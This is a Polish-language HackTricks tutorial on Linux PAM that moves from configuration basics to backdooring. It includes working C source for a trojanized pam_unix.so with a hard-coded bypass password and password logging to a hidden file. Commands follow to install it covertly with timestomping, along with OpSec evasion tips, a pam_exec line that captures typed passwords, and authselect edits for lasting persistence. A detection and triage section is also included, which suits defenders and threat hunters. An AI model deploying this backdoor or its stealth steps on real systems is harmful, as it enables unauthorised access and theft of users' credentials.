# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Podstawowe informacje

**PAM (Pluggable Authentication Modules)** pełni funkcję mechanizmu bezpieczeństwa, który **weryfikuje tożsamość użytkowników próbujących uzyskać dostęp do usług komputerowych**, kontrolując ich dostęp na podstawie różnych kryteriów. Działa podobnie do cyfrowego strażnika, zapewniając, że tylko autoryzowani użytkownicy mogą korzystać z określonych usług, a jednocześnie może ograniczać ich użycie, aby zapobiegać przeciążeniu systemu.

#### Pliki konfiguracyjne

- Systemy **Solaris i systemy oparte na UNIX** zazwyczaj korzystają z centralnego pliku konfiguracyjnego znajdującego się w `/etc/pam.conf`.
- **Systemy Linux** preferują podejście oparte na katalogu, przechowując konfiguracje poszczególnych usług w `/etc/pam.d`. Na przykład plik konfiguracyjny usługi login znajduje się w `/etc/pam.d/login`.

Przykładowa konfiguracja PAM dla usługi login może wyglądać następująco:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Obszary zarządzania PAM**

Te obszary, czyli grupy zarządzania, obejmują **auth**, **account**, **password** i **session**, z których każdy odpowiada za inne aspekty procesu uwierzytelniania i zarządzania sesją:

- **Auth**: Weryfikuje tożsamość użytkownika, często prosząc o hasło.
- **Account**: Obsługuje weryfikację konta, sprawdzając warunki takie jak członkostwo w grupie lub ograniczenia dotyczące pory dnia.
- **Password**: Zarządza aktualizacjami haseł, w tym sprawdzaniem złożoności i zapobieganiem atakom słownikowym.
- **Session**: Zarządza działaniami podczas rozpoczynania lub kończenia sesji usługi, takimi jak montowanie katalogów lub ustawianie limitów zasobów.

#### **Elementy sterujące modułów PAM**

Elementy sterujące określają reakcję modułu na powodzenie lub niepowodzenie, wpływając na cały proces uwierzytelniania. Obejmują one:

- **Required**: Niepowodzenie wymaganego modułu ostatecznie powoduje niepowodzenie, ale dopiero po sprawdzeniu wszystkich kolejnych modułów.
- **Requisite**: Natychmiastowe zakończenie procesu po niepowodzeniu.
- **Sufficient**: Powodzenie pomija pozostałe kontrole tego samego obszaru, chyba że kolejny moduł zakończy się niepowodzeniem.
- **Optional**: Powoduje niepowodzenie tylko wtedy, gdy jest jedynym modułem w stosie.

#### Semantyka ofensywna, która ma znaczenie

Podczas Backdooring PAM **lokalizacja wstawionej reguły** jest często ważniejsza niż sam payload:

- `include` i `substack` pobierają reguły z innych plików, więc edycja `sshd` może wpływać tylko na SSH, podczas gdy edycja `system-auth`, `common-auth` lub innego współdzielonego stosu wpływa jednocześnie na kilka usług.
- PAM obsługuje również elementy sterujące w nawiasach kwadratowych, takie jak `[success=1 default=ignore]`. Można je wykorzystać do **pomijania jednego lub większej liczby modułów** po pomyślnym przejściu niestandardowego sprawdzenia, zamiast jawnego zastępowania `pam_unix.so`.
- `module-path` może być **absolutną ścieżką** (`/usr/lib/security/pam_custom.so`) lub ścieżką **względną** względem domyślnego katalogu modułów PAM. We współczesnych systemach Linux rzeczywiste katalogi to często `/lib/security`, `/lib64/security`, `/usr/lib/security` lub ścieżki multiarch, takie jak `/usr/lib/x86_64-linux-gnu/security`.

Szybka wskazówka dla operatora: przed wprowadzeniem zmian zawsze odwzoruj **pełny graf usług**. Na przykład `sshd -> password-auth -> system-auth` w niektórych dystrybucjach lub `sshd -> system-remote-login -> system-login -> system-auth` w innych oznacza, że ten sam jednolinijkowy implant może mieć znacznie szerszy zasięg, niż zamierzano.

#### Przykładowy scenariusz

W konfiguracji z wieloma modułami auth proces przebiega w ścisłej kolejności. Jeśli moduł `pam_securetty` uzna terminal logowania za nieautoryzowany, logowania roota zostają zablokowane, jednak wszystkie moduły nadal są przetwarzane z powodu jego statusu "required". Moduł `pam_env` ustawia zmienne środowiskowe, potencjalnie poprawiając wygodę użytkownika. Moduły `pam_ldap` i `pam_unix` współpracują w celu uwierzytelnienia użytkownika, przy czym `pam_unix` próbuje użyć wcześniej podanego hasła, zwiększając wydajność i elastyczność metod uwierzytelniania.


## Backdooring PAM – Hooking `pam_unix.so`

Klasycznym sposobem uzyskania persistence w środowiskach Linux o wysokiej wartości jest **zastąpienie legalnej biblioteki PAM trojanizowanym drop-inem**. Ponieważ każde logowanie przez SSH / konsolę ostatecznie wywołuje `pam_unix.so:pam_sm_authenticate()`, kilka linii kodu C wystarczy do przechwytywania danych uwierzytelniających lub zaimplementowania obejścia uwierzytelniania za pomocą *magic* hasła.

### Ściągawka kompilacji
<details>
<summary>Przykładowy trojan `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Skompiluj i potajemnie zastąp:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Wskazówki OpSec
1. **Atomic overwrite** – zapisz dane do pliku tymczasowego, a następnie użyj `mv`, aby umieścić go we właściwym miejscu i uniknąć częściowo zapisanych bibliotek, które mogłyby zablokować SSH.
2. Umieszczenie pliku logów, np. `/usr/bin/.dbus.log`, pozwala mu wtapiać się w legalne artefakty pulpitu.
3. Zachowaj identyczne eksporty symboli (`pam_sm_setcred` itd.), aby uniknąć nieprawidłowego działania PAM.

### Wykrywanie
* Porównaj MD5/SHA256 `pam_unix.so` z pakietem dystrybucji.
* `rpm -V pam` lub `debsums -s libpam-modules` pozwala wykryć podmienione biblioteki bez ręcznego obliczania hashy.
* Sprawdź, czy w `/lib/security/` nie ma plików zapisywalnych przez wszystkich użytkowników ani nietypowych właścicieli.
* Reguła `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Przeszukaj konfiguracje PAM pod kątem nieoczekiwanych modułów: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Szybkie polecenia triage (po kompromitacji lub podczas threat huntingu)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Nadużywanie `pam_exec` w celu utrzymania dostępu
Zamiast zastępować `pam_unix.so`, mniej inwazyjnym rozwiązaniem jest dodanie linii `pam_exec` w `/etc/pam.d/sshd`, aby każde logowanie SSH uruchamiało implant, zachowując jednocześnie standardowy stack:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` otrzymuje metadane PAM w zmiennych środowiskowych, takich jak `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Po użyciu `expose_authtok` helper może również odczytać hasło ze `stdin` podczas faz `auth` lub `password`. Jeśli chcesz, aby helper działał z efektywnym UID zamiast rzeczywistego UID, dodaj `seteuid`.

Uwagi praktyczne:

- `session optional pam_exec.so ...` lepiej nadaje się do **działań po zalogowaniu**, takich jak ponowne otwieranie socketów lub uruchamianie odłączonego daemona.
- `auth optional pam_exec.so quiet expose_authtok ...` to typowy wybór do **przechwytywania danych uwierzytelniających**, ponieważ działa przed otwarciem sesji.
- `type=session` lub `type=auth` można użyć do ograniczenia wykonania do konkretnej fazy PAM i uniknięcia głośnego podwójnego wykonania.

### Przetrwanie działania narzędzi dystrybucyjnych: `authselect`

W systemach RHEL, CentOS Stream, Fedora i systemach pochodnych bezpośrednie zmiany w generowanych plikach, takich jak `/etc/pam.d/system-auth` lub `/etc/pam.d/password-auth`, mogą zostać **nadpisane przez `authselect`**. Aby zapewnić trwałość zmian, operatorzy często modyfikują aktywny custom profile w `/etc/authselect/custom/<profile>/`, a następnie ponownie go wybierają lub stosują.

Typowy workflow, gdy masz root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Ma to znaczenie zarówno dla działań ofensywnych, jak i triage: jeśli `/etc/pam.d/system-auth` zawiera banner `Generated by authselect` oraz `Do not modify this file manually`, rzeczywisty punkt persistence może znajdować się w `/etc/authselect/custom/`, a nie w `/etc/pam.d/`.

### Recent tradecraft seen in the wild

Najnowsze raporty z 2025 roku dotyczące backdoora **Plague** dla Linuxa pokazały tę samą podstawową ideę posuniętą jeszcze dalej: złośliwy komponent PAM ze **static bypass password**, a także czyszczenie zmiennych środowiskowych związanych z SSH i historii powłoki (`HISTFILE=/dev/null`) w celu ograniczenia śladów sesji po zalogowaniu. Jest to użyteczny hunting pattern, ponieważ logika backdoora może znajdować się w PAM, podczas gdy artefakty stealth pojawiają się dopiero **po** pomyślnym uwierzytelnieniu.


## Referencje

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
